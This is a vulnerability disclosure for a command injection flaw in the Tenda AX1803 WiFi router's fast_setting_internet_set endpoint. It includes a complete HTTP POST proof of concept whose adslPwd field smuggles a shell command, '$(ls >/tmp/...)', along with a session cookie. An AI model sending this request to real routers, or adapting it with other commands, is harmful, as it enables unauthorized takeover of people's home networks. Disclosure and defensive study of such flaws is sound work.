

# ***\*Tenda AX1803 has a command injection vulnerability\****

## ***\*Summary\****

• ***\*type\****：Command injection vulnerability

• ***\*supplier\****：腾达（https://tenda.com.cn）

• ***\*Product\****: WiFi 路由器 AX1803

• ***\*Official website：\**** [AX1803升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/download/detail-3225.html)

• ***\*Firmware download address：\****https://down.tenda.com.cn/uploadfile/AX1803/US_AX1803v2.1br_v1.0.0.1_2890_CN_ZGYD01.zip

Tendaax1803 router adopts WiFi 6 (802.11ax) technology, with a dual frequency concurrency rate of 1775mbps (2.4ghz:574mbps, 5ghz:1201mbps), and is equipped with a 1.5GHz high-performance quad core processor, which comprehensively improves the network load capacity, faster data forwarding, and more stable operation for a long time. It is the preferred device for building a multimedia home network! fast_setting_internet_set Command Execution Vulnerability in set



## ***\*describe\****

### **** 1, Product Information: ****

Overview of the latest version of simulation for Tenda AX1803 router:

![image-20220624183557535](img/image-20220624183557535-16570841965551.png)

 

 

 

### ****2. Vulnerability Details\****

Tenda AX1803 was found in fast_setting_internet_set Command injection vulnerability in set function

![image-20220624133917486](img/image-20220624133917486.png)

![img](img/{D2E0A7E4-0A94-794D-9F4D-264A4631CF8E}.jpg)

When we set netWanType=2, we get a command injection vulnerability when we log in.



## ***\*3. Recurring loopholes and POC\****

To reproduce the vulnerability, the following steps can be followed:

Start firmware (real machine) via qemu-system or other means

Attack using the following POC attacks

Note the replacement of password fields in cookies



```
POST /goform/fast_setting_internet_set
?0.20172657847322262 HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 183
Origin: http://192.168.10.1
Connection: close
Referer: http://192.168.10.1/main.html
Cookie: password=bb507bf3973a97a9bf1267699f712550vsbtgb

netWanType=2&adslUser=asd&adslPwd=$(ls >/tmp/ccccccccccccccccccccc)&vpnServer=&vpnUser=&vpnPwd=&vpnWanType=1&dnsAuto=1&staticIp=&mask=&gateway=&dns1=&dns2=&module=wan1&downSpeedLimit=
```





![image-20220706130247758](img/image-20220706130247758.png)